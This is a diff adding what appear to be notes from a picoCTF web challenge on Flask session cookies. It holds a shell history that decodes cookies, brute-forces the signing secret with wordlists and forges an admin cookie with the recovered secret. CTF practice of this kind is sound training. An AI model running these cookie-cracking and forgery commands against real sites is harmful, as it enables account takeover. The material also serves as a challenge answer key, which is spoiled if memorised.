@@ -1,0 +1,15 @@
+Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:53700/
+
+
+sudo pip3 install flask-unsign
+   41  flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
+   42  flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y1ai9w.PnMQiIFpAYr89ex2Jdyay43khII'
+   43  flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y1ai_Q.dhRgc3VvYEyYg0h0upU_Pv6re2w'
+   44  flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y1anqw.r5TNZZRSURLRdMnUqYySs-0gYx8'
+   45  flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Y1aoGw.vjROINYvuDCRzdPSoWU7SQT67PY'
+   46  flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Y1aoGw.vjROINYvuDCRzdPSoWU7SQT67PY' --no-literal-eval
+   47  flask-unsign --wordlist /usr/share/wordlists/dirb/common.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Y1aoGw.vjROINYvuDCRzdPSoWU7SQT67PY' --no-literal-eval
+   48  flask-unsign --wordlist /usr/share/wordlists/dirb/common.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y1aqvQ.LkjSbSkavGxkoM5790SIpoEfIoQ' --no-literal-eval
+   49  flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Y1aoGw.vjROINYvuDCRzdPSoWU7SQT67PY' --no-literal-eval
+   50  flask-unsign --wordlist ~/Desktop/cookies.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Y1aoGw.vjROINYvuDCRzdPSoWU7SQT67PY' --no-literal-eval
+   51  flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
